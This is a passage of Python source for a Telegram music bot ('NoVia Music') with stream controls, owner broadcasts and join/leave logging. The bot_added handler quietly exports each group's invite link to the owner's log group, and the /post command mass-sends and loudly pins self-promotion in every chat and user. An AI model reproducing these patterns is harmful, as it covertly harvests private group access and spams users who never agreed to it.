            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )

    await callback_query.answer()

@bot.on_message(filters.command("resume") & ~filters.private)
@chat_admins_only
async def resume_current_stream(client, message):
    chat_id = message.chat.id
    queued = queues.get(chat_id)
    if not queued:
        return await message.reply_text("**» ʙᴏᴛ ɪsɴ'ᴛ sᴛʀᴇᴀᴍɪɴɢ ᴏɴ ᴠɪᴅᴇᴏᴄʜᴀᴛ.**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
    is_stream = await is_stream_off(chat_id)
    if not is_stream:
        return await message.reply_text("**➻ sᴛʀᴇᴀᴍ ʀᴇsᴜᴍᴇᴅ.**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴘᴀᴜsᴇ sᴛʀᴇᴀᴍ", callback_data=f"pause_stream")]]),
        )
    try:
        await call.resume_stream(chat_id)
    except Exception:
        return await message.reply_text("**❖ ғᴀɪʟᴇᴛᴏ ʀᴇsᴜᴍᴇ sᴛʀᴇᴀᴍ.**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
    await stream_on(chat_id)
    return await message.reply_text("**➻ sᴛʀᴇᴀᴍ ʀᴇsᴜᴍᴇᴅ.**",
    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴘᴀᴜsᴇ sᴛʀᴇᴀᴍ", callback_data=f"pause_stream")]]),
    )
    
@bot.on_callback_query(filters.regex("toggle_stream"))
@chat_admins_only
async def toggle_stream_state(client, callback_query):
    chat_id = callback_query.message.chat.id
    queued = queues.get(chat_id)

    if not queued:
        await client.send_message(chat_id, "**» ʙᴏᴛ ɪsɴ'ᴛ sᴛʀᴇᴀᴍɪɴɢ ᴏɴ ᴠɪᴅᴇᴏᴄʜᴀᴛ.**",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
        return await callback_query.answer()

    is_paused = await is_stream_off(chat_id)

    if is_paused:
        try:
            await call.resume_stream(chat_id)
            await stream_on(chat_id)
            await client.send_message(chat_id, "**➻ sᴛʀᴇᴀᴍ ʀᴇsᴜᴍᴇᴅ.**",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴘᴀᴜsᴇ sᴛʀᴇᴀᴍ", callback_data=f"pause_stream")]]),
            )
        except Exception:
            await client.send_message(chat_id, "❖ ғᴀɪʟᴇᴅ to ʀᴇsᴜᴍᴇ.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
            )
    else:
        try:
            await call.pause_stream(chat_id)
            await stream_off(chat_id)
            await client.send_message(chat_id, "**➻ sᴛʀᴇᴀᴍ ʀᴇsᴜᴍᴇᴅ.**",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴘᴀᴜsᴇ sᴛʀᴇᴀᴍ", callback_data=f"pause_stream")]]),
            )
        except Exception:
            await client.send_message(chat_id, "❖ ғᴀɪʟᴇᴅ ᴛᴏ ᴘᴀᴜsᴇ.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
            )

    await callback_query.answer()

@bot.on_message(filters.command("end") & ~filters.private)
@chat_admins_only
async def stop_running_stream(client, message):
    chat_id = message.chat.id
    queued = queues.get(chat_id)
    if not queued:
        return await message.reply_text(
            "**» ʙᴏᴛ ɪsɴ'ᴛ sᴛʀᴇᴀᴍɪɴɢ ᴏɴ ᴠɪᴅᴇᴏᴄʜᴀᴛ.**"
        )
    await close_stream(chat_id)
    return await message.reply_text("**➻ sᴛʀᴇᴀᴍ ᴇɴᴅᴇᴅ/sᴛᴏᴩᴩᴇᴅ.**",
    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
    )

@bot.on_callback_query(filters.regex("end_stream"))
@chat_admins_only
async def end_stream_callback(client, callback_query):
    chat_id = callback_query.message.chat.id
    queued = queues.get(chat_id)

    if not queued:
        await client.send_message(chat_id, "**» ʙᴏᴛ ɪsɴ'ᴛ sᴛʀᴇᴀᴍɪɴɢ ᴏɴ ᴠɪᴅᴇᴏᴄʜᴀᴛ.**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
        return await callback_query.answer()

    await close_stream(chat_id)
    await callback_query.answer()
    await client.send_message(chat_id, "**➻ sᴛʀᴇᴀᴍ ᴇɴᴅᴇᴅ/sᴛᴏᴩᴩᴇᴅ.**",
    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
    )

@bot.on_message(filters.command("skip") & ~filters.private)
@chat_admins_only
async def skip_current_stream(client, message):
    chat_id = message.chat.id
    queued = queues.get(chat_id)
    if not queued:
        return await message.reply_text("**» ɴᴏ ᴍᴏʀᴇ ǫᴜᴇᴜᴇᴅ ᴛʀᴀᴄᴋs**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
    return await change_stream(chat_id)

@bot.on_callback_query(filters.regex("skip_stream"))
@chat_admins_only
async def skip_stream_callback(client, callback_query):
    chat_id = callback_query.message.chat.id
    queued = queues.get(chat_id)

    if not queued:
        await client.send_message(chat_id, "**» ɴᴏ ᴍᴏʀᴇ ǫᴜᴇᴜᴇᴅ ᴛʀᴀᴄᴋs**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
        return await callback_query.answer()

    await change_stream(chat_id)
    await client.send_message(chat_id, "**» sᴋɪᴘᴘᴇᴅ ᴛᴏ ɴᴇxᴛ sᴛʀᴇᴀᴍ.**",
    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
    )
    await callback_query.answer()

@bot.on_message(filters.command("stats") & only_owner)
async def check_stats(client, message):
    try:
        await message.delete()
    except Exception:
        pass
    active_audio = len(active_audio_chats)
    active_video = len(active_video_chats)
    total_chats = len(await get_served_chats())
    total_users = len(await get_served_users())
    
    caption = f"""
**✅ Active Audio Chats:** `{active_audio}`
**✅ Active Video Chats:** `{active_video}`

**✅ Total Served Chats:** `{total_chats}`
**✅ Total Served Users:** `{total_users}`
"""
    return await message.reply_text(caption)

@bot.on_message(filters.command(["broadcast", "gcast"]) & only_owner)
async def broadcast_message(client, message):
    try:
        await message.delete()
    except:
        pass
    if message.reply_to_message:
        x = message.reply_to_message.id
        y = message.chat.id
    else:
        if len(message.command) < 2:
            return await message.reply_text(
                f"""**🤖 Hey Give Me Some Text
Or Reply To A Message❗**"""
            )
        query = message.text.split(None, 1)[1]
        if "-pin" in query:
            query = query.replace("-pin", "")
        if "-nobot" in query:
            query = query.replace("-nobot", "")
        if "-pinloud" in query:
            query = query.replace("-pinloud", "")
        if "-user" in query:
            query = query.replace("-user", "")
        if query == "":
            return await message.reply_text(
                f"""**🤖 Hey Give Me Some Text
Or Reply To A Message❗**"""
            )

    if "-nobot" not in message.text:
        sent = 0
        pin = 0
        chats = []
        schats = await get_served_chats()
        for chat in schats:
            chats.append(int(chat["chat_id"]))
        for i in chats:
            try:
                m = (
                    await bot.forward_messages(i, y, x)
                    if message.reply_to_message
                    else await bot.send_message(i, text=query)
                )
                if "-pin" in message.text:
                    try:
                        await m.pin(disable_notification=True)
                        pin += 1
                    except Exception:
                        continue
                elif "-pinloud" in message.text:
                    try:
                        await m.pin(disable_notification=False)
                        pin += 1
                    except Exception:
                        continue
                sent += 1
            except FloodWait as e:
                await asyncio.sleep(e.value)
                continue
            except Exception:
                continue
        await message.reply_text(f"**✅ Global Broadcast Done.**\n\n__🤖 Broadcast Mesaages In\n{sent} Chats With {pin} Pins.__")

    if "-user" in message.text:
        susr = 0
        served_users = []
        susers = await get_served_users()
        for user in susers:
            served_users.append(int(user["user_id"]))
        for i in served_users:
            try:
                m = (
                    await bot.forward_messages(i, y, x)
                    if message.reply_to_message
                    else await bot.send_message(i, text=query)
                )
                susr += 1
            except FloodWait as e:
                await asyncio.sleep(e.value)
                continue
            except Exception:
                continue
        await message.reply_text(f"**✅ Global Broadcast Done.**\n\n__🤖 Broascast Mesaages To\n{susr} Users From Bot.__")

@bot.on_message(filters.command("post") & only_owner)
async def post_bot_promotion(client, message):
    total_chats = []
    schats = await get_served_chats()
    for chat in schats:
        total_chats.append(int(chat["chat_id"]))
    susers = await get_served_users()
    for user in susers:
        total_chats.append(int(user["user_id"]))
            
    photo = random.choice(SACHIN_PH)
    caption = f"""
❖  Introducing [NoVia Music](https://t.me/{client.me.username})
 
 ➜ latest lag-free update! Stream music seamlessly, get faster search results, and more! Try it out now!"""
    buttons = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="➕ ᴀᴅᴅ ᴍᴇ ɪɴ ʏᴏᴜʀ ᴄʜᴀᴛ ➕", url=f"https://t.me/{client.me.username}?startgroup=true",
                )
            ]
        ]
    )
    sent = 0
    for chat_id in total_chats:
        try:
            m = await client.send_photo(
                chat_id, photo=photo, caption=caption, reply_markup=buttons
            )
            sent = sent + 1
            await asyncio.sleep(5)
            try:
                await m.pin(disable_notification=False)
            except Exception:
                continue
        except FloodWait as e:
            await asyncio.sleep(e.value)
            continue
        except Exception:
            continue
    return await message.reply_text(f"**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴘᴏsᴛᴇᴅ ɪɴ {sent} ᴄʜᴀᴛs.**")

@bot.on_callback_query(filters.regex("close"))
async def force_close_anything(client, query):
    try:
        await query.message.delete()

        closed_by_mention = query.from_user.mention if query.from_user else "sᴏᴍᴇᴏɴᴇ"
        closed_message = f"❖ ᴄʟᴏsᴇᴅ ʙʏ: {closed_by_mention}"
        closed_msg = await query.message.reply(closed_message)

        await asyncio.sleep(3)
        await closed_msg.delete()

    except Exception as e:
        print(f"ᴇʀʀᴏʀ ᴡʜɪʟᴇ ᴄʟᴏsɪɴɢ ᴍᴇssᴀɢᴇ: {e}")

@bot.on_message(filters.command("ping"))
async def ping_command(client, message):
    start = time.time()
    m = await message.reply_text("ᴩɪɴɢɪɴɢ...")
    end = time.time()
    ping_time = round((end - start) * 1000)

    caption = f"**❖ ᴘɪɴɢᴇᴅ ʟᴀᴛᴇɴᴄʏ :** `{ping_time} ᴍs`"

    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ᴄʜᴀᴛ", url=f"https://t.me/{client.me.username}?startgroup=true")]
    ])

    await m.delete()
    await message.reply_text(
        caption,
        reply_markup=buttons
    )

@bot.on_message(filters.new_chat_members, group=-1)
async def bot_added(bot, message: Message):
    for member in message.new_chat_members:
        if member.id == bot.me.id:
            chat_id = message.chat.id
            chat_name = message.chat.title
            user_mention = message.from_user.mention if message.from_user else "sᴏᴍᴇᴏɴᴇ"
            total_members = await bot.get_chat_members_count(chat_id)

            try:
                chat_link = await bot.export_chat_invite_link(chat_id)
            except:
                chat_link = "ʟɪɴᴋ ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ"

            caption = f"""
**ʜᴇʏ {user_mention},**

**ᴛʜɪs ɪs {(await bot.get_me()).mention}**

**ᴛʜᴀɴᴋs ғᴏʀ ᴀᴅᴅɪɴɢ ᴍᴇ ɪɴ {chat_name} !!**  
**ɪ ᴄᴀɴ ɴᴏᴡ ᴩʟᴀʏ sᴏɴɢs ɪɴ ᴛʜɪs ᴄʜᴀᴛ.**
"""

            welcome_buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton("ᴜᴘᴅᴀᴛᴇs", url="https://t.me/NoViaUpdate")]
            ])
            await bot.send_message(
                chat_id,
                text=caption,
                reply_markup=welcome_buttons
            )

            await add_served_chat(chat_id)

            log_caption = f"""
❖ ʙᴏᴛ ᴀᴅᴅᴇᴅ ɪɴ ɴᴇᴡ ɢʀᴏᴜᴘ ❖

● ɢʀᴏᴜᴘ ɴᴀᴍᴇ ➠ {chat_name}
● ᴄʜᴀᴛ ɪᴅ ➠ `{chat_id}`
● ɢʀᴏᴜᴘ ʟɪɴᴋ ➠ {chat_link}
● ᴛᴏᴛᴀʟ ᴍᴇᴍʙᴇʀs ➠ {total_members}
● ᴀᴅᴅᴇᴅ ʙʏ ➠ {user_mention}
"""

            buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data="close")]
            ])

            log_msg = await bot.send_message(
                LOG_GROUP_ID,
                text=log_caption,
                reply_markup=buttons
            )

            await bot.pin_chat_message(
                chat_id=LOG_GROUP_ID,
                message_id=log_msg.id,
                disable_notification=True
            )
            break

@bot.on_message(filters.left_chat_member, group=-1)
async def bot_removed(bot, message):
    chat_id = message.chat.id
    member = message.left_chat_member

    if member.id == bot.me.id:
        user_mention = message.from_user.mention if message.from_user else "sᴏᴍᴇᴏɴᴇ"
        chat_name = message.chat.title

        log_caption = f"""
❖ ʙᴏᴛ ʟᴇғᴛ ᴛʜᴇ ɢʀᴏᴜᴘ ❖

● ɢʀᴏᴜᴘ ɴᴀᴍᴇ ➠ {chat_name}
● ᴄʜᴀᴛ ɪᴅ ➠ `{chat_id}`
● ʀᴇᴍᴏᴠᴇᴅ ʙʏ ➠ {user_mention}
"""

        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data="close")]
        ])

        log_msg = await bot.send_message(
            LOG_GROUP_ID,
            text=log_caption,
            reply_markup=buttons
        )

        await bot.pin_chat_message(
            chat_id=LOG_GROUP_ID,
            message_id=log_msg.id,
            disable_notification=True
        )

        await remove_served_chat(chat_id)

@call.on_stream_end()
async def stream_end_handler(_, update: Update):
    chat_id = update.chat_id
    print(f"Stream ended in chat {chat_id}")
    
    queued = queues.get(chat_id)
    
    if queued and len(queued) > 0:
        await change_stream(chat_id)
    else:
        success = await close_stream(chat_id)
        if success:
            await remove_active_media_chat(chat_id)
            await bot.send_message(
                chat_id, 
                "❌ Queue finished. Left voice chat.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Close", callback_data="close")]
                ])
            )

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    logs.info("❎ Goodbye, Bot Has Been Stopped‼️")
